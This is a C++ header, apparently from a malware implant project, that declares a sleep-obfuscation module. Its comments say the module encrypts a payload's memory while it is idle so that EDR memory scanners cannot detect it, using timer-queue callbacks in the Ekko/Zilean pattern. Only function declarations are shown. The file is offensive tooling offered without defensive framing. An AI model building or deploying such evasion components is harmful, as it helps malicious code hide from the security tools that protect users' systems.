#pragma once

#include <windows.h>

// Sleep Obfuscation (2025 technique — Ekko/Zilean pattern)
//
// When the payload is sleeping (idle), its memory is encrypted to prevent
// memory scanners from detecting it. On wakeup, the memory is decrypted
// and execution resumes.
//
// Uses timer callbacks (CreateTimerQueueTimer) to:
// 1. Encrypt the payload's memory region
// 2. Sleep for the requested duration
// 3. Decrypt the memory and resume
//
// This defeats periodic memory scanning by EDRs during idle periods.

namespace SleepObfuscate {

// Initialize the sleep obfuscation system.
bool Initialize();

// Obfuscated sleep: encrypts the specified memory region, sleeps,
// then decrypts and returns. Drop-in replacement for Sleep().
void ObfuscatedSleep(DWORD dwMilliseconds, void* pRegion, size_t regionSize);

// Check if sleep obfuscation is available on this system.
bool IsAvailable();

} // namespace SleepObfuscate
